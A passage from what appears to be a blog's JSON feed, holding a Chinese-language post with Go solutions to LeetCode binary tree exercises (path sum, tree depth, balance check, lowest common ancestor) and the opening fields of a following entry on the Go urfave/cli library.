data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1R3ZWx2ZWVlZS9BbGdvcml0aG1DYW1wMjAyMy9ibG9iL21haW4vMDhfQmluYXJ5VHJlZS9sZXZlbF8xL3RvcGljXzUuZ28=\">https://github.com/Twelveeee/AlgorithmCamp2023/blob/main/08_BinaryTree/level_1/topic_5.go</span></p>\n<blockquote>\n<p>给你二叉树的根节点  <code>root</code>  和一个表示目标和的整数  <code>targetSum</code>  。判断该树中是否存在 <strong>根节点到叶子节点</strong> 的路径，这条路径上所有节点值相加等于目标和  <code>targetSum</code>  。如果存在，返回  <code>true</code>  ；否则，返回  <code>false</code>  。</p>\n<p><strong>叶子节点</strong> 是指没有子节点的节点。</p>\n</blockquote>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">hasPathSum</span><span class=\"token punctuation\">(</span>root <span class=\"token operator\">*</span>TreeNode<span class=\"token punctuation\">,</span> targetSum <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">bool</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">if</span> root <span class=\"token operator\">==</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token keyword\">if</span> root<span class=\"token punctuation\">.</span>Left <span class=\"token operator\">==</span> <span class=\"token boolean\">nil</span> <span class=\"token operator\">&amp;&amp;</span> root<span class=\"token punctuation\">.</span>Right <span class=\"token operator\">==</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> root<span class=\"token punctuation\">.</span>Val<span class=\"token operator\">-</span>targetSum <span class=\"token operator\">==</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token function\">hasPathSum</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">.</span>Left<span class=\"token punctuation\">,</span> targetSum<span class=\"token operator\">-</span>root<span class=\"token punctuation\">.</span>Val<span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token function\">hasPathSum</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">.</span>Right<span class=\"token punctuation\">,</span> targetSum<span class=\"token operator\">-</span>root<span class=\"token punctuation\">.</span>Val<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"深度和高度问题\"><a class=\"anchor\" href=\"#深度和高度问题\">#</a> 深度和高度问题</h3>\n<h4 id=\"6二叉树的最大深度\"><a class=\"anchor\" href=\"#6二叉树的最大深度\">#</a> 6. 二叉树的最大深度</h4>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy9tYXhpbXVtLWRlcHRoLW9mLWJpbmFyeS10cmVlL2Rlc2NyaXB0aW9uLw==\">https://leetcode.cn/problems/maximum-depth-of-binary-tree/description/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1R3ZWx2ZWVlZS9BbGdvcml0aG1DYW1wMjAyMy9ibG9iL21haW4vMDhfQmluYXJ5VHJlZS9sZXZlbF8yL3RvcGljXzEuZ28=\">https://github.com/Twelveeee/AlgorithmCamp2023/blob/main/08_BinaryTree/level_2/topic_1.go</span></p>\n<blockquote>\n<p>给定一个二叉树  <code>root</code>  ，返回其最大深度。</p>\n<p>二叉树的 <strong>最大深度</strong> 是指从根节点到最远叶子节点的最长路径上的节点数。</p>\n</blockquote>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">maxDepth</span><span class=\"token punctuation\">(</span>root <span class=\"token operator\">*</span>TreeNode<span class=\"token punctuation\">)</span> <span class=\"token builtin\">int</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token function\">subMaxDepth</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">subMaxDepth</span><span class=\"token punctuation\">(</span>root <span class=\"token operator\">*</span>TreeNode<span class=\"token punctuation\">,</span> nowDepth <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">int</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token keyword\">if</span> root <span class=\"token operator\">==</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> nowDepth <span class=\"token operator\">-</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token keyword\">if</span> root<span class=\"token punctuation\">.</span>Left <span class=\"token operator\">==</span> <span class=\"token boolean\">nil</span> <span class=\"token operator\">&amp;&amp;</span> root<span class=\"token punctuation\">.</span>Right <span class=\"token operator\">==</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> nowDepth</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token function\">max</span><span class=\"token punctuation\">(</span><span class=\"token function\">subMaxDepth</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">.</span>Right<span class=\"token punctuation\">,</span> nowDepth<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">subMaxDepth</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">.</span>Left<span class=\"token punctuation\">,</span> nowDepth<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">max</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">int</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t<span class=\"token keyword\">if</span> a <span class=\"token operator\">></span> b <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> a</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t<span class=\"token keyword\">return</span> b</pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h4 id=\"7高度平衡二叉树\"><a class=\"anchor\" href=\"#7高度平衡二叉树\">#</a> 7. 高度平衡二叉树</h4>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy9iYWxhbmNlZC1iaW5hcnktdHJlZS8=\">https://leetcode.cn/problems/balanced-binary-tree/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1R3ZWx2ZWVlZS9BbGdvcml0aG1DYW1wMjAyMy9ibG9iL21haW4vMDhfQmluYXJ5VHJlZS9sZXZlbF8yL3RvcGljXzIuZ28=\">https://github.com/Twelveeee/AlgorithmCamp2023/blob/main/08_BinaryTree/level_2/topic_2.go</span></p>\n<blockquote>\n<p>给定一个二叉树，判断它是否是高度平衡的二叉树。</p>\n<p>本题中，一棵高度平衡二叉树定义为：</p>\n<p>一个二叉树<em>每个节点</em> 的左右两个子树的高度差的绝对值不超过 1 。</p>\n</blockquote>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">isBalanced</span><span class=\"token punctuation\">(</span>root <span class=\"token operator\">*</span>TreeNode<span class=\"token punctuation\">)</span> <span class=\"token builtin\">bool</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token function\">height</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> <span class=\"token operator\">>=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">height</span><span class=\"token punctuation\">(</span>node <span class=\"token operator\">*</span>TreeNode<span class=\"token punctuation\">)</span> <span class=\"token builtin\">int</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token keyword\">if</span> node <span class=\"token operator\">==</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\tleftHight <span class=\"token operator\">:=</span> <span class=\"token function\">height</span><span class=\"token punctuation\">(</span>node<span class=\"token punctuation\">.</span>Left<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\trightHight <span class=\"token operator\">:=</span> <span class=\"token function\">height</span><span class=\"token punctuation\">(</span>node<span class=\"token punctuation\">.</span>Right<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token keyword\">if</span> leftHight <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span> <span class=\"token operator\">||</span> rightHight <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span> <span class=\"token operator\">||</span> <span class=\"token function\">abs</span><span class=\"token punctuation\">(</span>leftHight<span class=\"token operator\">-</span>rightHight<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">1</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token function\">maxV2</span><span class=\"token punctuation\">(</span>leftHight<span class=\"token punctuation\">,</span> rightHight<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">maxV2</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">int</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t<span class=\"token keyword\">if</span> a <span class=\"token operator\">></span> b <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> a</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t<span class=\"token keyword\">return</span> b</pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">abs</span><span class=\"token punctuation\">(</span>x <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">int</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t<span class=\"token keyword\">if</span> x <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span> <span class=\"token operator\">*</span> x</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t<span class=\"token keyword\">return</span> x</pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h4 id=\"8二叉树的最小深度\"><a class=\"anchor\" href=\"#8二叉树的最小深度\">#</a> 8. 二叉树的最小深度</h4>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy9taW5pbXVtLWRlcHRoLW9mLWJpbmFyeS10cmVlL2Rlc2NyaXB0aW9uLw==\">https://leetcode.cn/problems/minimum-depth-of-binary-tree/description/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1R3ZWx2ZWVlZS9BbGdvcml0aG1DYW1wMjAyMy9ibG9iL21haW4vMDhfQmluYXJ5VHJlZS9sZXZlbF8yL3RvcGljXzMuZ28=\">https://github.com/Twelveeee/AlgorithmCamp2023/blob/main/08_BinaryTree/level_2/topic_3.go</span></p>\n<blockquote>\n<p>给定一个二叉树，找出其最小深度。</p>\n<p>最小深度是从根节点到最近叶子节点的最短路径上的节点数量。</p>\n<p>** 说明：** 叶子节点是指没有子节点的节点。</p>\n</blockquote>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">minDepth</span><span class=\"token punctuation\">(</span>root <span class=\"token operator\">*</span>TreeNode<span class=\"token punctuation\">)</span> <span class=\"token builtin\">int</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">if</span> root <span class=\"token operator\">==</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token keyword\">if</span> root<span class=\"token punctuation\">.</span>Left <span class=\"token operator\">==</span> <span class=\"token boolean\">nil</span> <span class=\"token operator\">&amp;&amp;</span> root<span class=\"token punctuation\">.</span>Right <span class=\"token operator\">==</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\tminDep <span class=\"token operator\">:=</span> <span class=\"token number\">10000</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token keyword\">if</span> root<span class=\"token punctuation\">.</span>Left <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\tminDep <span class=\"token operator\">=</span> <span class=\"token function\">min</span><span class=\"token punctuation\">(</span>minDep<span class=\"token punctuation\">,</span> <span class=\"token function\">minDepth</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">.</span>Left<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token keyword\">if</span> root<span class=\"token punctuation\">.</span>Right <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\tminDep <span class=\"token operator\">=</span> <span class=\"token function\">min</span><span class=\"token punctuation\">(</span>minDep<span class=\"token punctuation\">,</span> <span class=\"token function\">minDepth</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">.</span>Right<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t<span class=\"token keyword\">return</span> minDep <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">min</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">int</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t<span class=\"token keyword\">if</span> a <span class=\"token operator\">></span> b <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> b</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t<span class=\"token keyword\">return</span> a</pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h4 id=\"9n-叉树的最大深度\"><a class=\"anchor\" href=\"#9n-叉树的最大深度\">#</a> 9.N 叉树的最大深度</h4>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy9tYXhpbXVtLWRlcHRoLW9mLW4tYXJ5LXRyZWUvZGVzY3JpcHRpb24v\">https://leetcode.cn/problems/maximum-depth-of-n-ary-tree/description/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1R3ZWx2ZWVlZS9BbGdvcml0aG1DYW1wMjAyMy9ibG9iL21haW4vMDhfQmluYXJ5VHJlZS9sZXZlbF8yL3RvcGljXzQuZ28=\">https://github.com/Twelveeee/AlgorithmCamp2023/blob/main/08_BinaryTree/level_2/topic_4.go</span></p>\n<blockquote>\n<p>给定一个 N 叉树，找到其最大深度。</p>\n<p>最大深度是指从根节点到最远叶子节点的最长路径上的节点总数。</p>\n<p>N 叉树输入按层序遍历序列化表示，每组子节点由空值分隔</p>\n</blockquote>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">maxDepth</span><span class=\"token punctuation\">(</span>root <span class=\"token operator\">*</span>Node<span class=\"token punctuation\">)</span> <span class=\"token builtin\">int</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">if</span> root <span class=\"token operator\">==</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\tmaxDep <span class=\"token operator\">:=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> node <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> root<span class=\"token punctuation\">.</span>Children <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\tmaxDep <span class=\"token operator\">=</span> <span class=\"token function\">max</span><span class=\"token punctuation\">(</span>maxDep<span class=\"token punctuation\">,</span> <span class=\"token function\">maxDepth</span><span class=\"token punctuation\">(</span>node<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token keyword\">return</span> maxDep <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">max</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">int</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t<span class=\"token keyword\">if</span> a <span class=\"token operator\">></span> b <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> a</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t<span class=\"token keyword\">return</span> b</pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"祖先问题\"><a class=\"anchor\" href=\"#祖先问题\">#</a> 祖先问题</h3>\n<h4 id=\"10-二叉树的最近公共祖先\"><a class=\"anchor\" href=\"#10-二叉树的最近公共祖先\">#</a> 10. 二叉树的最近公共祖先</h4>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy9sb3dlc3QtY29tbW9uLWFuY2VzdG9yLW9mLWEtYmluYXJ5LXRyZWUv\">https://leetcode.cn/problems/lowest-common-ancestor-of-a-binary-tree/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1R3ZWx2ZWVlZS9BbGdvcml0aG1DYW1wMjAyMy9ibG9iL21haW4vMDhfQmluYXJ5VHJlZS9sZXZlbF8zL3RvcGljXzEuZ28=\">https://github.com/Twelveeee/AlgorithmCamp2023/blob/main/08_BinaryTree/level_3/topic_1.go</span></p>\n<blockquote>\n<p>给定一个二叉树，找到该树中两个指定节点的最近公共祖先。</p>\n<p>最近公共祖先的定义为：“对于有根树 T 的两个节点 p、q，最近公共祖先表示为一个节点 x，满足 x 是 p、q 的祖先且 x 的深度尽可能大（<strong>一个节点也可以是它自己的祖先</strong>）。”</p>\n</blockquote>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">lowestCommonAncestor</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">,</span> q <span class=\"token operator\">*</span>TreeNode<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span>TreeNode <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">if</span> root <span class=\"token operator\">==</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> root</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token comment\">// 如果当前节点为目标节点，则直接返回，不用判断底下节点，就算底下节点为目标节点，当前节点也是目标节点的公共祖先</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token keyword\">if</span> root<span class=\"token punctuation\">.</span>Val <span class=\"token operator\">==</span> q<span class=\"token punctuation\">.</span>Val <span class=\"token operator\">||</span> root<span class=\"token punctuation\">.</span>Val <span class=\"token operator\">==</span> p<span class=\"token punctuation\">.</span>Val <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> root</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\tleft <span class=\"token operator\">:=</span> <span class=\"token function\">lowestCommonAncestor</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">.</span>Left<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">,</span> q<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\tright <span class=\"token operator\">:=</span> <span class=\"token function\">lowestCommonAncestor</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">.</span>Right<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">,</span> q<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token comment\">// 当前节点为公共祖先</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token keyword\">if</span> left <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token operator\">&amp;&amp;</span> right <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> root</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t<span class=\"token comment\">// 把公共祖先传到最外层</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t<span class=\"token keyword\">if</span> left <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> left</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t<span class=\"token keyword\">return</span> right</pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure>",
            "tags": [
                "计算机科学",
                "算法训练2023",
                "数据结构",
                "算法"
            ]
        },
        {
            "id": "https://blog.twelveeee.top/2023/Go/Lib/urfave_cli/",
            "url": "https://blog.twelveeee.top/2023/Go/Lib/urfave_cli/",
            "title": "Go urfave cli 使用",
            "date_published": "2023-11-12T10:00:00.000Z",
